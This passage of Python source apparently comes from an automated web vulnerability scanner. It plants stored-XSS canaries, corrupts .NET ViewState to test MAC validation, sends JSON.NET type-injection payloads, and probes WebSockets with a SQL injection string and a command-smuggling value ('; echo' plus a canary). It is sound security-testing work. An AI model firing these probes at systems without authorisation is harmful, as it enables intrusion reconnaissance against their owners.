                                  timeout=aiohttp.ClientTimeout(total=8)) as r:
                await r.text(errors='replace')
        else:
            async with http.get(form['action'], params=data, allow_redirects=True,
                                 timeout=aiohttp.ClientTimeout(total=8)) as r:
                await r.text(errors='replace')
        with _lock:
            s = _sessions.get(sid)
            if s:
                s.setdefault('stored_xss_canaries', {})[canary] = {
                    'form_action': form['action'],
                    'method':      method,
                    'payload':     payload,
                }
    except Exception:
        pass


async def _sweep_stored_xss(sid, endpoints, http):
    """Sweep crawled URLs for stored XSS canaries — concurrent, hard-capped at 40 URLs."""
    with _lock:
        s = _sessions.get(sid)
        canaries = dict(s.get('stored_xss_canaries', {})) if s else {}
    if not canaries:
        return

    sem = asyncio.Semaphore(8)
    _TO = aiohttp.ClientTimeout(total=6)

    async def _check_one(ep):
        if _stopped(sid):
            return
        url = ep['url']
        async with sem:
            try:
                async with http.get(url, allow_redirects=True, timeout=_TO) as resp:
                    body = await resp.text(errors='replace')
            except Exception:
                return
        for canary, ctx in canaries.items():
            if canary not in body:
                continue
            same_page = url.split('?')[0] == ctx['form_action'].split('?')[0]
            title = 'Stored XSS (Same Page Persistence)' if same_page else 'Stored XSS'
            detail = (
                f'Canary {canary!r} injected via {ctx["method"]} {ctx["form_action"]} '
                f'appeared in a fresh GET of {url}. '
                + ('Payload persisted on the same page after submission.'
                   if same_page else
                   'Payload persisted and rendered on a different page - confirmed cross-page stored XSS.')
            )
            _add_finding(sid, {
                'severity': 'critical',
                'title':    title,
                'endpoint': url,
                'detail':   detail,
                'evidence': {
                    'canary':             canary,
                    'injection_endpoint': ctx['form_action'],
                    'injection_method':   ctx['method'],
                    'found_at':           url,
                    'payload':            ctx['payload'],
                },
            })

    await asyncio.gather(*[_check_one(ep) for ep in endpoints[:40]])


# ── .NET Deserialization ──────────────────────────────────────────────────────

async def _check_dotnet_deser(sid, url, http, ep):
    """Detect .NET deserialization via ViewState MAC bypass and JSON.NET TypeNameHandling."""
    _TO = aiohttp.ClientTimeout(total=6)

    # ── ViewState MAC bypass — only fires if page has a __VIEWSTATE input ─────
    for form in ep.get('forms', []):
        vs_inp = next(
            (i for i in form.get('inputs', []) if i.get('name', '').upper() == '__VIEWSTATE'),
            None,
        )
        if not vs_inp or not vs_inp.get('value'):
            continue
        try:
            import base64 as _b64
            raw = _b64.b64decode(vs_inp['value'] + '==')
            mid = len(raw) // 2
            corrupted = raw[:mid] + bytes([b ^ 0xFF for b in raw[mid:mid + 4]]) + raw[mid + 4:]
            corrupted_b64 = _b64.b64encode(corrupted).decode()
        except Exception:
            continue
        data = {i['name']: i.get('value', '') or 'test' for i in form.get('inputs', [])}
        data['__VIEWSTATE'] = corrupted_b64
        baseline_body = ''
        try:
            async with http.get(url, allow_redirects=False, timeout=_TO) as resp:
                baseline_body = await resp.text(errors='replace')
        except Exception:
            pass
        try:
            if form['method'] == 'POST':
                async with http.post(form['action'], data=data,
                                     allow_redirects=False, timeout=_TO) as resp:
                    body = await resp.text(errors='replace')
                    status = resp.status
            else:
                async with http.get(form['action'], params=data,
                                    allow_redirects=False, timeout=_TO) as resp:
                    body = await resp.text(errors='replace')
                    status = resp.status
            m = _DOTNET_DESER_ERRORS.search(body)
            vs_err = 'viewstate' in body.lower() and 'viewstate' not in baseline_body.lower()
            if (m and not _DOTNET_DESER_ERRORS.search(baseline_body)) or (status == 500 and vs_err):
                _add_finding(sid, {
                    'severity': 'high',
                    'title':    '.NET ViewState - MAC Validation Disabled',
                    'endpoint': url,
                    'detail': (
                        'Corrupted ViewState accepted without MAC error - MAC validation '
                        'appears disabled. Exploitable via ysoserial.net gadget chains.'
                    ),
                    'evidence': {
                        'form':        form['action'],
                        'http_status': status,
                        'error':       m.group(0) if m else f'HTTP {status} with ViewState error',
                    },
                })
                return
        except Exception:
            pass

    # ── JSON.NET TypeNameHandling — only probe if response looks like JSON ────
    try:
        async with http.get(url, allow_redirects=False, timeout=_TO) as resp:
            ct = resp.headers.get('Content-Type', '')
            baseline_body = await resp.text(errors='replace')
    except Exception:
        return
    if 'json' not in ct and not baseline_body.lstrip().startswith(('{', '[')):
        return  # skip: not a JSON endpoint, no point sending JSON.NET payloads
    for pl in _JSONNET_PAYLOADS:
        if _stopped(sid):
            return
        try:
            async with http.post(
                url, data=pl,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False, timeout=_TO,
            ) as resp:
                body = await resp.text(errors='replace')
            m = _DOTNET_DESER_ERRORS.search(body)
            if m and not _DOTNET_DESER_ERRORS.search(baseline_body):
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    '.NET Deserialization - JSON.NET TypeNameHandling',
                    'endpoint': url,
                    'detail': (
                        f'JSON.NET $type injection triggered deserialization error: {m.group(0)!r}. '
                        'TypeNameHandling is enabled - exploitable via known gadget chains.'
                    ),
                    'evidence': {'payload': pl[:120], 'error': m.group(0)},
                })
                return
        except Exception:
            pass


# ── WebSocket Injection ───────────────────────────────────────────────────────

async def _check_ws_inject(sid, ws_url, http):
    """Connect to a WebSocket endpoint and inject XSS/SQLi/CMDi payloads."""
    canary = f'ds1ws{uuid.uuid4().hex[:8]}'
    # 3 representative payloads (one per class) — keeps total time under 10s per endpoint
    ws_payloads = [
        (canary,              'echo'),   # unsanitised reflection / XSS
        ("' OR '1'='1'--",   'sqli'),
        (f'; echo {canary}',  'cmdi'),
    ]
    try:
        async with http.ws_connect(
            ws_url,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False,
        ) as ws:
            for payload, ptype in ws_payloads:
                if _stopped(sid):
                    return
                try:
                    await asyncio.wait_for(ws.send_str(payload), timeout=2.0)
                    msg = await asyncio.wait_for(ws.receive(), timeout=2.0)
                    if msg.type not in (aiohttp.WSMsgType.TEXT, aiohttp.WSMsgType.BINARY):
                        continue
                    data = (msg.data if isinstance(msg.data, str)
                            else msg.data.decode('utf-8', errors='replace'))
                    if ptype == 'echo' and canary in data:
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    'WebSocket - Reflected XSS / Unsanitized Echo',
                            'endpoint': ws_url,
                            'detail': (
                                f'XSS canary {canary!r} reflected verbatim in WebSocket '
                                'response without sanitization.'
                            ),
                            'evidence': {'payload': payload, 'response': data[:300]},
                        })
                        return
                    if ptype == 'sqli':
                        m = _SQLI_ERRORS.search(data)
                        if m:
                            _add_finding(sid, {
                                'severity': 'high',
                                'title':    'WebSocket - SQL Injection',
                                'endpoint': ws_url,
                                'detail': f'DB error {m.group(0)!r} in WebSocket response to SQLi payload.',
                                'evidence': {'payload': payload, 'error': m.group(0)},
                            })
                            return
                    if ptype == 'cmdi':
                        m = _CMD_ERROR_SIG.search(data)
                        if m:
                            _add_finding(sid, {
                                'severity': 'critical',
                                'title':    'WebSocket - Command Injection',
                                'endpoint': ws_url,
                                'detail': f'Command injection signal {m.group(0)!r} in WebSocket response.',
                                'evidence': {'payload': payload, 'error': m.group(0)},
                            })
                            return
                except (asyncio.TimeoutError, Exception):
                    pass
    except Exception:
        pass
